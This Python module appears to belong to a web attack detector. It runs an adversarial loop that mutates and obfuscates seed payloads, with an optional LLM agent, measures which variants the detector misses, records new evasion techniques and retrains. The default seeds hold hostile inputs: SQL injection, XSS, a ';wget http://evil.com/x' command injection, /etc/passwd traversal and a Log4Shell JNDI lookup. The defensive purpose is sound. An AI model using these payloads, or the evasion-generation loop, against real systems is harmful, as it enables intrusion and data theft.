"""自我迭代闭环：生成 → 检测 → 漏检发现新手法 → 缓存/重训 → 下一轮。"""

from __future__ import annotations

import json
import random
from collections import Counter
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from iga_guard.adversarial.ast_mutator import ast_obfuscate, ast_obfuscate_batch
from iga_guard.adversarial.mutator import mutate_batch
from iga_guard.dataset.obfuscation_techniques import expand_payload
from iga_guard.evolution.self_train import incremental_retrain, log_failure
from iga_guard.evolution.technique_discovery import discover_from_miss
from iga_guard.evolution.technique_registry import TechniqueRegistry
from iga_guard.models import HttpRequest


@dataclass
class RoundResult:
    round: int
    total: int
    detected: int
    missed: int
    recall: float
    new_techniques: list[str] = field(default_factory=list)
    miss_samples: list[dict] = field(default_factory=list)
    retrain: dict = field(default_factory=dict)
    cache_stats: dict = field(default_factory=dict)


def _default_seeds() -> list[tuple[str, str]]:
    return [
        ("1 union select 1,2--", "SQLi"),
        ("<script>alert(1)</script>", "XSS"),
        (";wget http://evil.com/x", "CMD"),
        ("../../../etc/passwd", "PathTraversal"),
        ("${jndi:ldap://evil.com/a}", "CMD"),
    ]


def generate_round_variants(
    pool: list[tuple[str, str]],
    registry: TechniqueRegistry,
    *,
    round_num: int,
    seed: int,
    variants_per_seed: int = 4,
    max_variants: int = 200,
    llm_agent=None,
    miss_pool: list[tuple[str, str]] | None = None,
) -> list[tuple[str, str, str]]:
    rng = random.Random(seed + round_num * 997)
    out: list[tuple[str, str, str]] = []
    seen: set[str] = set()

    # LLM 自主迭代变种（优先注入）
    if llm_agent is not None and getattr(llm_agent, "available", lambda: False)():
        llm_batch = llm_agent.generate_batch(
            pool,
            n_per_seed=min(3, variants_per_seed),
            miss_pool=miss_pool,
            round_num=round_num,
            max_total=min(max_variants // 2, 40),
        )
        for v, label, src in llm_batch:
            if v not in seen:
                seen.add(v)
                out.append((v, label, src))
            if len(out) >= max_variants:
                return out

    for payload, label in pool:
        sources: list[tuple[str, str]] = [(payload, "seed")]
        for v in mutate_batch(payload, label, n=2):
            sources.append((v, "mutator"))
        for v in ast_obfuscate_batch(payload, n=2) or [ast_obfuscate(payload)]:
            sources.append((v, "ast"))
        for item in expand_payload(payload, label, n=variants_per_seed, seed=seed + hash(payload) % 999):
            sources.append((item["payload"], item.get("source", "obfuscation")))
        for name in registry.applicable_for(label):
            dv = registry.apply(payload, name, rng)
            if dv != payload:
                sources.append((dv, f"discovered:{name}"))

        rng.shuffle(sources)
        for v, src in sources:
            if v not in seen:
                seen.add(v)
                out.append((v, label, src))
            if len(out) >= max_variants:
                return out
    return out


class AutoEvolveLoop:
    """可配置轮次的自我演化编排器。"""

    def __init__(
        self,
        root: Path,
        *,
        config_path: Path | None = None,
    ) -> None:
        from iga_guard.pipeline import IgaGuardEngine, load_config

        self.root = root
        cfg_path = config_path or root / "configs" / "default.yaml"
        self.cfg = load_config(cfg_path)
        self.engine = IgaGuardEngine(self.cfg)
        self.registry = TechniqueRegistry(root / "data" / "cache" / "discovered_techniques.json")
        self.failures_path = root / "data" / "cache" / "auto_evolve_failures.jsonl"
        self.history_path = root / "data" / "cache" / "auto_evolve_history.jsonl"
        self.llm_agent = self._init_llm_agent()

    def _init_llm_agent(self):
        llm_cfg = self.cfg.get("llm_agent", {})
        if not llm_cfg.get("enabled", False):
            return None
        from iga_guard.adversarial.llm_agent import LLMAdversarialAgent
        agent = LLMAdversarialAgent(llm_cfg)
        agent.history_path = self.root / "data" / "cache" / "llm_agent_history.jsonl"
        return agent if agent.available() else None

    def _detect(self, payload: str, label: str) -> tuple[bool, object]:
        url = f"http://auto.local/test?p={payload}"
        report = self.engine.analyze_url("GET", url)
        hit = report.detection.is_malicious or report.detection.label == label
        return hit, report

    def _apply_learning(self, misses: list[dict]) -> tuple[dict, dict]:
        retrain_result: dict = {}
        cache_result: dict = {}

        for m in misses:
            req = HttpRequest(method="GET", url=f"http://auto.local/?p={m['payload']}", source="auto_evolve")
            report = self.engine.analyze_request(req)
            log_failure(str(self.failures_path), report, m["label"])

        evo = self.cfg.get("evolution", {})
        detector = self.engine.detector
        if hasattr(detector, "base"):
            detector = detector.base
        if misses and len(misses) >= evo.get("retrain_min_samples", 5):
            retrain_result = incremental_retrain(
                detector,
                str(self.failures_path),
                str(self.root / "models" / "fusion_detector.joblib"),
                min_samples=evo.get("retrain_min_samples", 5),
                base_train_csv=str(self.root / "data" / "master" / "train_obfuscated.csv"),
                max_base_samples=evo.get("max_base_samples", 80_000),
                failure_augment=evo.get("failure_augment", 2),
            )

        cache_cfg = self.cfg.get("continual_cache", {})
        if cache_cfg.get("enabled") and hasattr(self.engine.detector, "cache"):
            cache = self.engine.detector.cache
            if cache is not None:
                for m in misses:
                    cache.append(m["payload"], m["label"], source="auto_evolve", save=False)
                cache.save()
                cache_result = cache.stats()
        return retrain_result, cache_result

    def run_round(
        self,
        pool: list[tuple[str, str]],
        *,
        round_num: int = 1,
        seed: int = 42,
        variants_per_seed: int = 4,
        max_variants: int = 200,
        learn: bool = True,
        miss_pool: list[tuple[str, str]] | None = None,
    ) -> RoundResult:
        variants = generate_round_variants(
            pool, self.registry,
            round_num=round_num, seed=seed,
            variants_per_seed=variants_per_seed,
            max_variants=max_variants,
            llm_agent=self.llm_agent,
            miss_pool=miss_pool,
        )
        detected = 0
        misses: list[dict] = []
        new_techniques: list[str] = []

        for payload, label, source in variants:
            hit, report = self._detect(payload, label)
            if hit:
                detected += 1
            else:
                misses.append({
                    "payload": payload,
                    "label": label,
                    "source": source,
                    "predicted": report.detection.label,
                    "confidence": round(report.detection.confidence, 4),
                })
                found = discover_from_miss(self.registry, payload, label)
                new_techniques.extend(found)

        retrain_result: dict = {}
        cache_result: dict = {}
        if learn and misses:
            retrain_result, cache_result = self._apply_learning(misses)

        total = len(variants)
        recall = round(detected / total, 4) if total else 0.0
        result = RoundResult(
            round=round_num,
            total=total,
            detected=detected,
            missed=len(misses),
            recall=recall,
            new_techniques=list(dict.fromkeys(new_techniques)),
            miss_samples=misses,
            retrain=retrain_result,
            cache_stats=cache_result,
        )
        self._append_history(result, miss_dist=dict(Counter(m["label"] for m in misses)))
        return result

    def run(
        self,
        *,
        rounds: int = 3,
        seed: int = 42,
        variants_per_seed: int = 4,
        max_variants: int = 200,
        learn_each_round: bool = True,
        seed_pool: list[tuple[str, str]] | None = None,
    ) -> list[RoundResult]:
        pool = list(seed_pool or _default_seeds())
        results: list[RoundResult] = []
        failure_pool = list(pool)
        prev_miss_pool: list[tuple[str, str]] = []

        for rnd in range(1, rounds + 1):
            current = failure_pool if rnd > 1 and failure_pool else pool
            rr = self.run_round(
                current,
                round_num=rnd,
                seed=seed,
                variants_per_seed=variants_per_seed,
                max_variants=max_variants,
                learn=learn_each_round,
                miss_pool=prev_miss_pool if rnd > 1 else None,
            )
            results.append(rr)
            if rr.miss_samples:
                failure_pool = [(m["payload"], m["label"]) for m in rr.miss_samples]
                prev_miss_pool = list(failure_pool)
            else:
                failure_pool = list(pool)
                prev_miss_pool = []

        return results

    def _append_history(self, result: RoundResult, miss_dist: dict) -> None:
        self.history_path.parent.mkdir(parents=True, exist_ok=True)
        record = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "round": result.round,
            "total": result.total,
            "detected": result.detected,
            "missed": result.missed,
            "recall": result.recall,
            "new_techniques": result.new_techniques,
            "registry_size": len(self.registry.techniques),
            "miss_distribution": miss_dist,
            "retrain": result.retrain,
            "cache": result.cache_stats,
        }
        with self.history_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")

    def summary(self, results: list[RoundResult]) -> dict:
        llm_status = self.llm_agent.status() if self.llm_agent else {"enabled": False}
        return {
            "rounds": len(results),
            "final_recall": results[-1].recall if results else 0,
            "total_new_techniques": sum(len(r.new_techniques) for r in results),
            "registry": self.registry.stats(),
            "llm": llm_status,
            "history": str(self.history_path),
        }
